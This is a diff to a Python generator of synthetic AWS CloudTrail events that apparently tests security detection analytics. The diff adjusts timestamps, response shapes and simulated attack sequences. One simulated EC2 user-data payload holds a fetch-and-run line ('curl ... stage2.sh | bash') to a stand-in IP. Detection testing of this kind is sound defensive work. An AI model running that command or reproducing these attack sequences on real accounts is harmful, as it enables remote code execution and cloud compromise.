@@ -7301,7 +7301,8 @@ def _generate_imds_credential_theft(config, context=None):
 
 # Regions the simulated account does not normally use. Compute/discovery there
 # is what the "dormant region" and "multiple regions" analytics key on.
-_DORMANT_REGIONS = ["ap-southeast-2", "eu-west-1", "ca-central-1", "sa-east-1"]
+_DORMANT_REGIONS = ["ap-southeast-2", "eu-west-1", "ca-central-1", "sa-east-1",
+                    "us-west-2", "eu-central-1", "ap-northeast-1", "ap-south-1"]
 
 
 def _gap_ctx(config, context, *, external=True, allow_root=False, region=None):
@@ -7330,9 +7331,29 @@ def _policy_doc(statements):
                       separators=(',', ':'))
 
 
-def _urlencode(value):
-    import urllib.parse
-    return urllib.parse.quote(value, safe='')
+def _event_time(base, offset_seconds):
+    """CloudTrail ``eventTime`` for ``base`` plus an offset, in whole seconds."""
+    return (base + datetime.timedelta(seconds=offset_seconds)).strftime('%Y-%m-%dT%H:%M:%SZ')
+
+
+def _stagger(events, span=30.0):
+    """Give a sequence of events distinct, ordered ``eventTime`` values.
+
+    ``_get_base_event`` stamps every event with the same wall-clock second, so
+    sequence- and rate-based analytics (failed AssumeRole bursts, API
+    throttling, multi-region sweeps) see a single instant and cannot order the
+    calls. Spread the events evenly across ``span`` seconds, preserving list
+    order.
+    """
+    if len(events) < 2:
+        return events
+    # End the sequence at "now": CloudTrail events cannot be timestamped in the
+    # future, so spread them backwards from the current second.
+    base = datetime.datetime.now(datetime.UTC) - datetime.timedelta(seconds=span)
+    step = span / (len(events) - 1)
+    for index, event in enumerate(events):
+        event["eventTime"] = _event_time(base, index * step)
+    return events
 
 
 # -- Identity, trust and cross-account access -------------------------------
@@ -7341,8 +7362,11 @@ def _generate_iam_role_cross_account_trust(config, context=None):
     """(Threat) CreateRole whose trust policy names a foreign AWS account.
 
     Triggers XSIAM: "AWS IAM Role Created with Cross-Account Access" [Low].
-    CloudTrail URL-encodes assumeRolePolicyDocument in both requestParameters and
-    responseElements; that encoding is reproduced here. NOT tenant-verified.
+    CloudTrail records the trust policy as a *plain JSON string* in both
+    requestParameters and responseElements, with an ISO-8601 ``createDate`` and
+    a requestParameters ``path``, matching real CreateRole records (and the
+    benign CreateRole baseline), which use plain JSON and ISO timestamps, not
+    URL-encoded documents.
     """
     user_identity, ip_address, _, account_id = _gap_ctx(config, context, region='us-east-1')
     foreign = _foreign_account(config, account_id)
@@ -7353,7 +7377,6 @@ def _generate_iam_role_cross_account_trust(config, context=None):
         "Principal": {"AWS": f"arn:aws:iam::{foreign}:root"},
         "Action": "sts:AssumeRole",
     }])
-    encoded = _urlencode(trust)
     role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
     role_id = f"AROA{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=17))}"
     now = datetime.datetime.now(datetime.UTC)
@@ -7363,7 +7386,8 @@ def _generate_iam_role_cross_account_trust(config, context=None):
     event.update({
         "requestParameters": {
             "roleName": role_name,
-            "assumeRolePolicyDocument": encoded,
+            "path": "/",
+            "assumeRolePolicyDocument": trust,
             "description": "Cross-account automation role",
             "maxSessionDuration": 3600,
         },
@@ -7372,8 +7396,8 @@ def _generate_iam_role_cross_account_trust(config, context=None):
             "roleName": role_name,
             "roleId": role_id,
             "arn": role_arn,
-            "createDate": now.strftime('%b %d, %Y, %I:%M:%S %p'),
-            "assumeRolePolicyDocument": encoded,
+            "createDate": now.strftime('%Y-%m-%dT%H:%M:%SZ'),
+            "assumeRolePolicyDocument": trust,
         }},
         "resources": [{"type": "AWS::IAM::Role", "ARN": role_arn, "accountId": account_id}],
     })
@@ -7384,7 +7408,8 @@ def _generate_iam_update_trust_policy(config, context=None):
     """(Threat) UpdateAssumeRolePolicy adding a foreign account to an existing role.
 
     Triggers XSIAM: "AWS IAM Role's Trusted Policy Modification Allows Cross-Account
-    Access" [Low]. NOT tenant-verified.
+    Access" [Low]. The policy is emitted as plain JSON to match the CreateRole
+    convention.
     """
     user_identity, ip_address, _, account_id = _gap_ctx(config, context, region='us-east-1')
     foreign = _foreign_account(config, account_id)
@@ -7407,7 +7432,7 @@ def _generate_iam_update_trust_policy(config, context=None):
                             api_version="2010-05-08", read_only=False)
     event.update({
         "requestParameters": {"roleName": role_name,
-                              "policyDocument": _urlencode(trust)},
+                              "policyDocument": trust},
         "responseElements": None,
         "resources": [{"type": "AWS::IAM::Role", "ARN": role_arn, "accountId": account_id}],
     })
@@ -7571,7 +7596,7 @@ def _generate_log_enumeration(config, context=None):
         ev.update({"requestParameters": params or None, "responseElements": None,
                    "resources": []})
         events.append(ev)
-    return events
+    return _stagger(events, span=random.uniform(15, 30))
 
 
 def _generate_logging_external_kms(config, context=None):
@@ -7629,12 +7654,19 @@ def _generate_logging_bucket_deletion(config, context=None):
 
     Triggers XSIAM: "Suspicious activity on logging bucket" (base Informational;
     Low+ variations "Suspicious deletion on CloudTrail logging bucket" and
-    "Suspicious deletion on S3 access logs bucket"). NOT tenant-verified.
+    "Suspicious deletion on S3 access logs bucket"). The bucket must be a real
+    logging destination: the previous "any bucket containing 'log'" selection
+    could pick `vpc-flow-logs-storage`, which is not a CloudTrail or S3-access
+    log bucket.
     """
     user_identity, ip_address, region, account_id = _gap_ctx(config, context)
     aws_conf = config.get(CONFIG_KEY, {})
-    bucket = random.choice([b for b in aws_conf.get('s3_buckets', []) if 'log' in b]
-                           or ['logs-archive-central'])
+    buckets = aws_conf.get('s3_buckets', [])
+    preferred = [b for b in buckets
+                 if 'cloudtrail' in b.lower() or 'access-log' in b.lower()
+                 or 'access_log' in b.lower()]
+    fallback = [b for b in buckets if 'log' in b.lower()]
+    bucket = random.choice(preferred or fallback or ['cloudtrail-logs-org-wide'])
     today = datetime.datetime.now(datetime.UTC)
     keys = [f"AWSLogs/{account_id}/CloudTrail/{region}/{today:%Y/%m/%d}/"
             f"{account_id}_CloudTrail_{region}_{_rand_hex(8)}.json.gz" for _ in range(5)]
@@ -7647,10 +7679,14 @@ def _generate_logging_bucket_deletion(config, context=None):
         "eventCategory": "Data",
         "requestParameters": {
             "bucketName": bucket,
-            "delete": {"objects": [{"key": k} for k in keys], "quiet": True},
-            "Host": f"{bucket}.s3.{region}.amazonaws.com",
+            "delete": {"objects": [{"key": k} for k in keys], "quiet": False},
         },
-        "responseElements": {"requestCharged": None},
+        # DeleteObjects returns a DeleteResult; a bare requestCharged is not a
+        # response shape CloudTrail emits (verified against the benign
+        # DeleteObjects baseline and real tenant rows).
+        "responseElements": {
+            "DeleteResult": {"Deleted": [{"Key": k} for k in keys]},
+        },
         "resources": [{"type": "AWS::S3::Bucket", "ARN": bucket_arn,
                        "accountId": account_id}],
     })
@@ -7775,7 +7811,7 @@ def _generate_security_group_remote_access(config, context=None):
                                         "description": "temporary admin access"}]},
             }]},
         },
-        "responseElements": {"requestId": str(uuid.uuid4()), "_return": True},
+        "responseElements": {"_return": True},
         "resources": [{"type": "AWS::EC2::SecurityGroup",
                        "ARN": f"arn:aws:ec2:{region}:{account_id}:security-group/{sg}",
                        "accountId": account_id}],
@@ -8344,19 +8380,29 @@ def _generate_ebs_snapshot_created(config, context=None):
     volume = random.choice(aws_conf.get('ebs_volumes', ['vol-00000000000000000']))
     instance = random.choice(aws_conf.get('ec2_instances', ['i-00000000000000000']))
     events = []
-    for i in range(random.randint(2, 3)):
+    count = random.randint(2, 3)
+    # End the burst at "now"; snapshots cannot be stamped in the future.
+    base_time = (datetime.datetime.now(datetime.UTC)
+                 - datetime.timedelta(seconds=(count - 1) * 20))
+    for i in range(count):
         snap = f"snap-{_rand_hex(17)}"
+        # CreateSnapshot echoes the request description back in the response;
+        # the two must match (verified against the benign CreateSnapshot
+        # baseline and real tenant rows).
+        description = f"backup-{_rand_hex(6)}"
+        started = base_time + datetime.timedelta(seconds=i * 20)
         ev = _get_base_event(config, user_identity, ip_address, region,
                              "CreateSnapshot", "ec2.amazonaws.com",
                              api_version="2016-11-15", read_only=False)
+        ev["eventTime"] = started.strftime('%Y-%m-%dT%H:%M:%SZ')
         ev.update({
             "requestParameters": {"volumeId": volume,
-                                  "description": f"backup-{_rand_hex(6)}"},
+                                  "description": description},
             "responseElements": {
                 "snapshotId": snap, "volumeId": volume, "status": "pending",
-                "startTime": int(datetime.datetime.now(datetime.UTC).timestamp() * 1000),
+                "startTime": int(started.timestamp() * 1000),
                 "volumeSize": 100, "ownerId": account_id,
-                "description": f"backup-{_rand_hex(6)}",
+                "description": description,
             },
             "resources": [
                 {"type": "AWS::EC2::Instance",
@@ -8455,7 +8501,7 @@ def _generate_secrets_mass_dump(config, context=None):
                            "ARN": secret_id, "accountId": account_id}],
         })
         events.append(ev)
-    return events
+    return _stagger(events, span=random.uniform(30, 60))
 
 
 def _generate_ssm_parameters_dump(config, context=None):
@@ -8486,7 +8532,7 @@ def _generate_ssm_parameters_dump(config, context=None):
                            "accountId": account_id} for name in batch],
         })
         events.append(ev)
-    return events
+    return _stagger(events, span=random.uniform(10, 25))
 
 
 # -- Compute / discovery ---------------------------------------------------
@@ -8502,7 +8548,7 @@ def _generate_multi_region_compute(config, context=None):
     aws_conf = config.get(CONFIG_KEY, {})
     instance_types = aws_conf.get('large_instance_types', ['p4d.24xlarge'])
     ami = "ami-0abcdef1234567890"
-    regions = [region] + [r for r in _DORMANT_REGIONS if r != region][:3]
+    regions = [region] + [r for r in _DORMANT_REGIONS if r != region][:5]
     events = []
     for call_region in regions:
         instance_id = f"i-{_rand_hex(17)}"
@@ -8530,7 +8576,7 @@ def _generate_multi_region_compute(config, context=None):
                            "accountId": account_id}],
         })
         events.append(ev)
-    return events
+    return _stagger(events, span=random.uniform(90, 180))
 
 
 def _generate_multi_region_discovery(config, context=None):
@@ -8541,7 +8587,7 @@ def _generate_multi_region_discovery(config, context=None):
     multiple AWS services and regions"). NOT tenant-verified.
     """
     user_identity, ip_address, region, account_id = _gap_ctx(config, context)
-    regions = [region] + [r for r in _DORMANT_REGIONS if r != region][:3]
+    regions = [region] + [r for r in _DORMANT_REGIONS if r != region][:5]
     calls = [
         ("DescribeInstances", "ec2.amazonaws.com", "2016-11-15"),
         ("DescribeVpcs", "ec2.amazonaws.com", "2016-11-15"),
@@ -8556,7 +8602,7 @@ def _generate_multi_region_discovery(config, context=None):
             ev.update({"requestParameters": {}, "responseElements": None,
                        "resources": []})
             events.append(ev)
-    return events
+    return _stagger(events, span=random.uniform(120, 240))
 
 
 def _generate_compute_outside_region(config, context=None):
@@ -8713,12 +8759,17 @@ def _generate_user_data_modify_reboot(config, context=None):
     payload = base64.b64encode(
         b"#!/bin/bash\ncurl -s http://203.0.113.10/stage2.sh | bash\n").decode()
     events = []
+    base_time = datetime.datetime.now(datetime.UTC)
+    reboot_delay = random.randint(20, 90)
     ev = _get_base_event(config, user_identity, ip_address, region,
                          "ModifyInstanceAttribute", "ec2.amazonaws.com",
                          api_version="2016-11-15", read_only=False)
+    ev["eventTime"] = _event_time(base_time, -reboot_delay)
     ev.update({
         "requestParameters": {"instanceId": instance, "userData": {"value": payload}},
-        "responseElements": None,
+        # ModifyInstanceAttribute is a mutating EC2 call; CloudTrail records a
+        # boolean return (matching the benign EC2 baseline), not a null body.
+        "responseElements": {"return": True, "requestId": str(uuid.uuid4())},
         "resources": [{"type": "AWS::EC2::Instance",
                        "ARN": f"arn:aws:ec2:{region}:{account_id}:instance/{instance}",
                        "accountId": account_id}],
@@ -8727,6 +8778,7 @@ def _generate_user_data_modify_reboot(config, context=None):
     ev2 = _get_base_event(config, user_identity, ip_address, region, "RebootInstances",
                           "ec2.amazonaws.com", api_version="2016-11-15",
                           read_only=False)
+    ev2["eventTime"] = _event_time(base_time, 0)
     ev2.update({
         "requestParameters": {"instancesSet": {"items": [{"instanceId": instance}]}},
         "responseElements": {"requestId": str(uuid.uuid4()), "return": True},
@@ -8756,9 +8808,12 @@ def _generate_ec2_backdoor_public(config, context=None):
     profile_arn = f"arn:aws:iam::{account_id}:instance-profile/{profile_name}"
     port = random.choice([22, 3389])
     events = []
+    base_time = datetime.datetime.now(datetime.UTC)
+    ingress_delay = random.randint(10, 45)
     ev = _get_base_event(config, user_identity, ip_address, region, "RunInstances",
                          "ec2.amazonaws.com", api_version="2016-11-15",
                          read_only=False)
+    ev["eventTime"] = _event_time(base_time, -ingress_delay)
     ev.update({
         "requestParameters": {
             "instancesSet": {"items": [{"imageId": ami, "instanceType": itype,
@@ -8789,6 +8844,7 @@ def _generate_ec2_backdoor_public(config, context=None):
     ev2 = _get_base_event(config, user_identity, ip_address, region,
                           "AuthorizeSecurityGroupIngress", "ec2.amazonaws.com",
                           api_version="2016-11-15", read_only=False)
+    ev2["eventTime"] = _event_time(base_time, 0)
     ev2.update({
         "requestParameters": {
             "groupId": sg,
@@ -8798,7 +8854,10 @@ def _generate_ec2_backdoor_public(config, context=None):
                                         "description": "backdoor"}]},
             }]},
         },
-        "responseElements": {"requestId": str(uuid.uuid4()), "_return": True},
+        # EC2 boolean mutating calls serialize as {"_return": true} (verified
+        # against the benign AuthorizeSecurityGroupIngress baseline and real
+        # tenant rows).
+        "responseElements": {"_return": True},
         "resources": [{"type": "AWS::EC2::SecurityGroup",
                        "ARN": f"arn:aws:ec2:{region}:{account_id}:security-group/{sg}",
                        "accountId": account_id}],
@@ -8912,15 +8971,19 @@ def _generate_failed_assume_role(config, context=None):
                            "accountId": account_id}],
         })
         events.append(ev)
-    return events
+    # Seven failures in one second looks like a single retry; a credential
+    # probe is spread over tens of seconds. Rate analytics need the spread.
+    return _stagger(events, span=random.uniform(45, 90))
 
 
 def _generate_api_throttling(config, context=None):
-    """(Threat) A burst of API calls that all return ThrottlingException.
+    """(Threat) A burst of API calls that all return RequestLimitExceeded.
 
     Triggers XSIAM: "Cloud identity reached a throttling API rate" (base
     Informational; Low+ variation "Cloud identity reached a highly unusual
-    throttling API rate"). NOT tenant-verified.
+    throttling API rate"). EC2 documents ``RequestLimitExceeded`` as its
+    throttling error; mixing in the generic ``ThrottlingException`` produced an
+    inconsistent error distribution.
     """
     user_identity, ip_address, region, account_id = _gap_ctx(config, context)
     events = []
@@ -8931,12 +8994,12 @@ def _generate_api_throttling(config, context=None):
         ev.update({
             "requestParameters": {},
             "responseElements": None,
-            "errorCode": random.choice(["ThrottlingException", "RequestLimitExceeded"]),
-            "errorMessage": "Rate exceeded",
+            "errorCode": "RequestLimitExceeded",
+            "errorMessage": "Request limit exceeded.",
             "resources": [],
         })
         events.append(ev)
-    return events
+    return _stagger(events, span=random.uniform(30, 60))
 
 
 def _generate_console_first_login_nonuser(config, context=None):
